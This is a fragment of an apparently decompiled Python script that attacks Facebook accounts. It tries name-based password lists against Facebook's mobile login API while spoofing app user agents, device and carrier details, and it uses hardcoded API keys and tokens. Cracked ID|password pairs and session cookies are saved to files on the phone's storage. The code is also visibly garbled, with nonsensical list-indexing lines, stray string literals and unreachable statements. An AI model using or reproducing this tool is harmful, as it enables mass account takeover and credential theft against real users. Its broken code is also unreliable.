            'X693',
            'X695',
            'X695C'])
        ams = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
        network = random.choice([
            'Zong',
            'null',
            'Banglalink',
            'Roshan',
            'Marshmallow',
            'Telekom China'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ';[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A520K;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=720,height=1920};FB_FW/1;] Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/315.0.0.7.131;FBPN/com.facebook.lite;FBLC/es_ES;FBBV/128740588;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = ('256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',)
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (random.choice(digits))(range(2))
        jazoest = li2 + j1
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '256002347743983%7C374e60f8b9bb6b8cbb30f78030438895',
            'sig': '4c854da0db9429f4913c2a1b221c1d30' }
        headers = {
            'X-Fb-Device-Group': '6080',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Friendly-Name': 'authenticate',
            'X-Fb-Request-Analytics-Tags': 'unknown',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'Content-Length': '2126' }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            print(f'''\r\r {G}VEUX {A}➤ {G}{ids} {A}•{G} {pas}''')
            os.system('espeak -a 300 "VENOM,  OK,  VENOM,  THANKS,  "')
            open('/sdcard/VEUX-OK.txt', 'a').write(ids + '|' + pas + '\n')
            oks.append(ids)
            'MOBILE.LTE'
        if twf in str(po):
            if 'y' in pcp:
                print('\r\r \x1b[1;34m[veux-2F] ' + ids + ' | ' + pas)
                twf.append(ids)
                'X-Fb-Connection-Type'
        if 'www.facebook.com' in po['error']['message']:
            if 'y' in pcp:
                print(f'''\r\r{R}({A}VEUX{R}) ''' + ids + ' | ' + pas + '{R}')
                open('/sdcard/VEUX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                '24807555'
            open('/sdcard/VENOM/VENOM-CP.txt', 'a').write(ids + '|' + pas + '\n')
            'X-Fb-Connection-Bandwidth'
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            'OAuth null'
            time.sleep(10)
            return None
        if 'OAuth null':
            e = 'Authorization'
            e = None
            del e
            return None
        e = 'Authorization'

def api2(ids, names, passlist):
    global loop
    []['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-DZ'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s']([]['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-DZ'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}''']([]['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-DZ'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') ']) % (loop, len(oks), len(cps)))                                        
    sys.stdout.flush()
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    []['\r\r'][f'''{R}''']['('][f'''{A}''']['VEUX-XD'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['METHOD-DZ'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']['%s'][f'''{R}'''][') '][f'''{R}''']['- '][f'''{R}''']['('][f'''{A}''']
    ln = fn
    for pw in passlist:
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        ios_version = random.choice([
            '10_0_2',
            '10_1_1',
            '10_2',
            '10_2_1',
            '10_3_1',
            '10_3_2',
            '10_3_3'])
        android_version = f'''Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}'''
        facebook_version = f'''{random.randint(10, 437)}.0.0.{random.randint(1, 99)}.{random.randint(1, 200)}'''
        fbbv = str(random.randint(10000000, 99999999))
        fbsv = f'''{random.uniform(4, 10):.1f}'''
        density = random.choice([
            '2.0',
            '2.25',
            '2.75',
            '3.0',
            '3.25',
            '3 75'])
        width = random.randint(720, 1440)
        height = random.randint(1080, 2560)
        fblc = random.choice([
            'ja_JP',
            'ex_MX',
            'en_CU',
            'en_US',
            'fr_FR',
            'fa_IR',
            'es_ES',
            'pt_BR',
            'de_DE',
            'it_IT',
            'ja_JP',
            'ko_KR',
            'ru_RU',
            'zh_CN',
            'ar_AE',
            'en_GB'])
        fbcr = random.choice([
            'Telenor',
            'fido',
            'MOVO AFRICA',
            'UFONE-PAKTel',
            'Zong',
            'Jazz',
            'SCO',
            'Jio',
            'Vodafone',
            'Airtel',
            'BSNL',
            'MTNL',
            'Grameenphone',
            'Robi',
            'Banglalink',
            'Teletalk',
            'Telkomsel',
            'Indosat Ooredoo',
            'Axiata',
            'Tri',
            'Smartfren',
            'China Mobile',
            'Unicom',
            'Telecom',
            'Satcom',
            'Docomo',
            'Rakuten',
            'IIJmio',
            'Orange',
            'Verizon',
            'AT&T',
            'T-Mobile',
            'Sprint',
            'Vodafone',
            'Telefonica',
            'EE',
            'Orange',
            'Three'])
        fban = random.choice([
            'FB4A',
            'FB5A',
            'FB6A'])
        fbpn = random.choice([
            'com.facebook.katana',
            'com.facebook.orca',
            'messenger-android',
            'com.facebook.lite'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(49, 66)) + '.0.0.' + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ';FBBV/' + str(random.randint(11111111, 77777777)) + ";[Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/316.0.0.8.55;FBPN/messenger-android;FBLC/ar_AE;FBBV/240503520;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'+'Davik/2.1.0 (Linux; U; Android 13; Infinix X6525 Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/323.0.0.1.111;FBPN/com.facebook.orca;FBLC/en_CU;FBBV/648505603;FBCR/Ooredoo;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6525;FBSV/13;FBCA/arm64-v8a:armeabi-v7a:armeabi;]'+'Davik/2.1.0 (Linux; U; Android 12; SM-M315F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/316.0.0.1.75;FBPN/com.facebook.lite;FBLC/en_GB;FBBV/566658418;FBCR/Djezzy;FBMF/samsung;FBBD/samsung;FBDV/SM-M315F;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"
        device_id = str(uuid.uuid4())
        adid = str(uuid.uuid4())
        data = {
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler' }
        head = {
            'x-fb-http-engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
        q = json.loads(po)
        if 'session_key' in q:
            ckkk = (i['name'] + '=' + i['value'])(q['session_cookies']())
            ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            cookie = f'''sb={ssbb};{ckkk}'''
            print(f'''\r\r {G}VEUX {A}➤ {G}{ids} {A}•{G} {pas}''')
            os.system('espeak -a 300 "VEUX,  OK,  VEUX,  THANKS,  "')
            open('/sdcard/VEUX_m2_OK.txt', 'a').write(ids + '|' + pas + '\n')
            open('/sdcard/RABAH_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
            oks.append(ids)
            Elite(ids, pas, ckkk)
            ';'.join
        if 'www.facebook.com' in q['error']['message']:
            if 'y' in pcp:
                open('/sdcard/VEUX-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                'gzip, deflate'
            open('/sdcard/RABAH-CP.txt', 'a').write(ids + '|' + pas + '\n')
            'accept-encoding'
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            'graphservice'
            time.sleep(10)
            return None
        if 'graphservice':
            e = 'X-FB-Request-Analytics-Tags'
            e = None
            del e
            return None
        e = 'X-FB-Request-Analytics-Tags'
        del e

menu()